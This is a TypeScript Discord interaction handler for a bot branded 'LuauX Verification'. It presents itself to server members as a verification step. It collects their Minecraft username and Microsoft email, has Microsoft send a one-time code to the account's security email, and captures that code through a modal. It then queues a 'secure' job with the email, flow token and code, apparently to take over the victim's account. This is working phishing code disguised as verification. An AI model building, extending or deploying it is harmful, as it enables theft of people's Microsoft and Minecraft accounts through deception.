import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";
import { CookieJar, sendAuth, detectAuthMethod, sendOtt } from "@/lib/microsoft-auth";
import nacl from "tweetnacl";

function verifyDiscordSignature(
  rawBody: string,
  signature: string,
  timestamp: string,
  clientPublicKey: string,
): boolean {
  try {
    const ts = Number(timestamp);
    if (!Number.isFinite(ts)) return false;
    // Allow 10 min clock skew (Discord recommends ~5; serverless clocks can drift)
    const ageSec = Math.abs(Date.now() / 1000 - ts);
    if (ageSec > 600) return false;

    const keyHex = clientPublicKey.replace(/\s+/g, "").trim();
    if (!/^[0-9a-fA-F]{64}$/.test(keyHex)) return false;

    const message = new TextEncoder().encode(timestamp + rawBody);
    const sig = Uint8Array.from(Buffer.from(signature, "hex"));
    const key = Uint8Array.from(Buffer.from(keyHex, "hex"));
    return nacl.sign.detached.verify(message, sig, key);
  } catch {
    return false;
  }
}

function getModalField(
  components: Array<Record<string, unknown>> | undefined,
  customId: string,
): string {
  if (!components) return "";
  for (const row of components) {
    const fields = row?.components as Array<Record<string, unknown>> | undefined;
    for (const field of fields || []) {
      if (field?.custom_id === customId) return String(field.value || "").trim();
    }
  }
  return "";
}

function db() {
  return createClient(process.env.SUPABASE_URL!, process.env.SUPABASE_SERVICE_ROLE_KEY!, {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

/** Interaction follow-up — no Bot auth header required (token is the secret) */
async function editOriginal(
  applicationId: string,
  interactionToken: string,
  body: Record<string, unknown>,
) {
  const res = await fetch(
    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}/messages/@original`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    },
  );
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    console.error("[interactions] editOriginal failed:", res.status, t.slice(0, 300));
  }
}

function successEmbed(description: string) {
  return {
    title: "✅ Verification",
    description,
    color: 0x50c878,
    footer: { text: "LuauX Verification" },
  };
}

function errorEmbed(description: string) {
  return {
    title: "❌ Verification Failed",
    description,
    color: 0xff5c5c,
    footer: { text: "LuauX Verification" },
  };
}

async function resolveBotCredentials(
  rawBody: string,
  signature: string,
  timestamp: string,
  guildId?: string,
): Promise<{ ok: boolean; botToken: string | null; publicKey: string | null }> {
  const centralPublicKey = (
    process.env.DISCORD_PUBLIC_KEY ||
    process.env.DISCORD_CLIENT_PUBLIC_KEY ||
    ""
  )
    .replace(/\s+/g, "")
    .trim();

  if (guildId) {
    const { data: settings } = await db()
      .from("verification_settings")
      .select("bot_public_key, bot_token")
      .eq("guild_id", guildId)
      .maybeSingle();

    if (settings?.bot_public_key) {
      if (verifyDiscordSignature(rawBody, signature, timestamp, settings.bot_public_key)) {
        return {
          ok: true,
          botToken: settings.bot_token || null,
          publicKey: settings.bot_public_key,
        };
      }
    }
  }

  if (
    centralPublicKey &&
    verifyDiscordSignature(rawBody, signature, timestamp, centralPublicKey)
  ) {
    return {
      ok: true,
      botToken: process.env.DISCORD_BOT_TOKEN || null,
      publicKey: centralPublicKey,
    };
  }

  // PING has no guild_id — try all stored public keys
  const { data: allSettings } = await db()
    .from("verification_settings")
    .select("bot_public_key, bot_token")
    .not("bot_public_key", "is", null);

  const tried = new Set<string>();
  for (const row of allSettings || []) {
    const key = (row.bot_public_key || "").replace(/\s+/g, "").trim();
    if (!key || tried.has(key)) continue;
    tried.add(key);
    if (verifyDiscordSignature(rawBody, signature, timestamp, key)) {
      return { ok: true, botToken: row.bot_token || null, publicKey: key };
    }
  }

  return { ok: false, botToken: null, publicKey: null };
}

export const Route = createFileRoute("/api/discord/interactions")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const signature = request.headers.get("x-signature-ed25519") || "";
        const timestamp = request.headers.get("x-signature-timestamp") || "";
        const rawBody = await request.text();

        if (!signature || !timestamp) {
          return new Response("Missing signature headers", { status: 401 });
        }

        let body: Record<string, unknown>;
        try {
          body = JSON.parse(rawBody);
        } catch {
          return new Response("Invalid JSON", { status: 400 });
        }

        const guildId = body.guild_id as string | undefined;
        const resolved = await resolveBotCredentials(rawBody, signature, timestamp, guildId);

        if (!resolved.ok) {
          console.error("[interactions] Invalid signature", {
            type: body.type,
            guildId: guildId || null,
          });
          return new Response("Invalid signature", { status: 401 });
        }

        const botToken = resolved.botToken;
        const appId = body.application_id as string;
        const interactionToken = body.token as string;

        // PING
        if (body.type === 1) {
          return Response.json({ type: 1 });
        }

        // Modal Submit (Type 5)
        if (body.type === 5) {
          const modalData = body.data as Record<string, unknown>;
          const customId = modalData.custom_id as string;
          const components = modalData.components as Array<Record<string, unknown>>;
          const member = body.member as Record<string, unknown> | undefined;
          const gId = (body.guild_id as string) || "";
          const discordId = (member?.user as Record<string, string>)?.id || "";
          const channelId = (body.channel_id as string) || "";

          // --- Modal 1: MC Username + Email ---
          // CRITICAL: Discord requires a response in ~3s. Defer immediately, then do MS work.
          if (customId === "verify_mc_info") {
            const username =
              getModalField(components, "mc_username") ||
              String(
                (
                  (components?.[0] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();
            const email =
              getModalField(components, "mc_email") ||
              String(
                (
                  (components?.[1] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();

            // Defer ephemeral response NOW (type 5)
            const deferred = Response.json({
              type: 5,
              data: { flags: 64 },
            });

            // Background work after ack
            void (async () => {
              try {
                if (!username || !email) {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
                  });
                  return;
                }
                if (!/^[\w.+-]+@[\w.-]+\.\w{2,}$/.test(email)) {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Invalid email format.")],
                  });
                  return;
                }

                let authInfo;
                try {
                  const { credentials } = await sendAuth(email);
                  authInfo = detectAuthMethod(credentials);
                } catch (e) {
                  console.error("[interactions] sendAuth error:", e);
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        "Failed to contact Microsoft. Try again in a minute.",
                      ),
                    ],
                  });
                  return;
                }

                if (authInfo.method === "none") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        `No email OTP available for this account. Details: ${(authInfo as { detail?: string }).detail || "N/A"}`,
                      ),
                    ],
                  });
                  return;
                }

                if (authInfo.method === "authenticator") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        "Authenticator-only accounts are not supported. Use an account with email OTP / recovery email.",
                      ),
                    ],
                  });
                  return;
                }

                const { securityEmail, flowToken } = authInfo as {
                  method: "email_otp";
                  securityEmail: string;
                  flowToken: string;
                };

                const jar = new CookieJar();
                let otpSent = false;
                try {
                  otpSent = await sendOtt(jar, email, securityEmail);
                } catch (e) {
                  console.error("[interactions] sendOtt error:", e);
                }

                if (!otpSent) {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        "Failed to send verification code. Check the email, wait for OTP cooldown, or try again later.",
                      ),
                    ],
                  });
                  return;
                }

                const { error: sessionErr } = await db().from("verification_sessions").insert({
                  discord_id: discordId,
                  guild_id: gId,
                  mc_username: username,
                  mc_email: email,
                  status: "otp_sent",
                  flow_token: flowToken || "",
                  security_email: securityEmail,
                  channel_id: channelId,
                });

                if (sessionErr) {
                  console.error("[interactions] session insert:", sessionErr.message);
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        `Database error saving session: ${sessionErr.message}. Run the production SQL migration if FKs block inserts.`,
                      ),
                    ],
                  });
                  return;
                }

                await editOriginal(appId, interactionToken, {
                  embeds: [
                    successEmbed(
                      `A verification code has been sent to **${securityEmail}**.\n\nCheck inbox/spam for a 6-digit code, then click **Submit Code**.`,
                    ),
                  ],
                  components: [
                    {
                      type: 1,
                      components: [
                        {
                          type: 2,
                          style: 3,
                          label: "Submit Code",
                          custom_id: "verify_submit_code",
                        },
                      ],
                    },
                  ],
                });
              } catch (e) {
                console.error("[interactions] verify_mc_info async error:", e);
                try {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Unexpected error during verification. Try again.")],
                  });
                } catch {
                  /* ignore */
                }
              }
            })();

            return deferred;
          }

          // --- Modal 2: OTP Code ---
          if (customId === "verify_otp_code") {
            const otpCode =
              getModalField(components, "otp_code") ||
              String(
                (
                  (components?.[0] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();

            if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Please enter a valid 6-digit code.")],
                },
              });
            }

            let sessionQuery = db()
              .from("verification_sessions")
              .select("*")
              .eq("discord_id", discordId)
              .eq("status", "otp_sent")
              .order("created_at", { ascending: false })
              .limit(1);
            if (gId) sessionQuery = sessionQuery.eq("guild_id", gId);

            const { data: sessions } = await sessionQuery;
            const session = sessions?.[0];
            if (!session) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [
                    errorEmbed(
                      "No pending verification found. Click Verify and start over.",
                    ),
                  ],
                },
              });
            }

            const { data: claimed } = await db()
              .from("verification_sessions")
              .update({ status: "securing" })
              .eq("id", session.id)
              .eq("status", "otp_sent")
              .select("id")
              .maybeSingle();

            if (!claimed) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Already processing. Please wait.")],
                },
              });
            }

            const { data: settings } = await db()
              .from("verification_settings")
              .select("verified_role_id, bot_token, channel_id, discord_id")
              .eq("guild_id", session.guild_id)
              .maybeSingle();

            const { data: job, error: jobError } = await db()
              .from("bot_jobs")
              .insert({
                // Store owner for worker ownership; member id is in config
                discord_id: settings?.discord_id || discordId,
                type: "secure",
                status: "pending",
                config: {
                  email: session.mc_email,
                  flowToken: session.flow_token,
                  code: otpCode,
                  mcUsername: session.mc_username,
                  guildId: session.guild_id,
                  channelId: session.channel_id || settings?.channel_id || channelId,
                  discordId,
                  roleId: settings?.verified_role_id || "",
                  sessionId: session.id,
                  botToken: settings?.bot_token || botToken || null,
                  ownerDiscordId: settings?.discord_id || null,
                },
              })
              .select("id")
              .single();

            if (jobError || !job) {
              console.error("[interactions] secure job insert failed:", jobError?.message);
              await db()
                .from("verification_sessions")
                .update({ status: "otp_sent" })
                .eq("id", session.id);
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [
                    errorEmbed(
                      `Failed to queue secure job: ${jobError?.message || "unknown"}. Run production hardening SQL (bot_jobs type secure).`,
                    ),
                  ],
                },
              });
            }

            return Response.json({
              type: 4,
              data: {
                flags: 64,
                embeds: [
                  successEmbed(
                    "✅ Code accepted! Securing your account (30–90s). Results will post in this channel when done.",
                  ),
                ],
                components: [],
              },
            });
          }

          return Response.json({
            type: 4,
            data: { flags: 64, content: "Unknown modal" },
          });
        }

        // Message Component (Type 3)
        if (body.type === 3) {
          const data = body.data as Record<string, unknown>;
          const customId = data.custom_id as string;
          const member = body.member as Record<string, unknown> | undefined;
          const gId = body.guild_id as string;
          const memberId = (member?.user as Record<string, string>)?.id;

          if (customId === "verify_member") {
            if (!memberId || !gId) {
              return Response.json({
                type: 4,
                data: { flags: 64, content: "Missing member or guild information." },
              });
            }

            const { data: settings } = await db()
              .from("verification_settings")
              .select("verified_role_id, bot_token")
              .eq("guild_id", gId)
              .maybeSingle();

            if (!settings) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  content:
                    "This server is not configured for verification. Set it up in the LuauX Dashboard.",
                },
              });
            }

            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_mc_info",
                title: "Verification",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_username",
                        label: "Minecraft Username",
                        style: 1,
                        required: true,
                        min_length: 3,
                        max_length: 16,
                        placeholder: "Enter your MC username",
                      },
                    ],
                  },
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_email",
                        label: "Minecraft / Microsoft Email",
                        style: 1,
                        required: true,
                        min_length: 5,
                        max_length: 100,
                        placeholder: "email@example.com",
                      },
                    ],
                  },
                ],
              },
            });
          }

          if (customId === "verify_submit_code") {
            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_otp_code",
                title: "Enter Verification Code",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "otp_code",
                        label: "6-Digit Code",
                        style: 1,
                        required: true,
                        min_length: 6,
                        max_length: 6,
                        placeholder: "123456",
                      },
                    ],
                  },
                ],
              },
            });
          }

          if (customId === "verify_check_status") {
            return Response.json({
              type: 4,
              data: {
                flags: 64,
                content: "Status updates post automatically when securing finishes.",
              },
            });
          }
        }

        return Response.json({
          type: 4,
          data: { flags: 64, content: "Unknown interaction" },
        });
      },
    },
  },
});
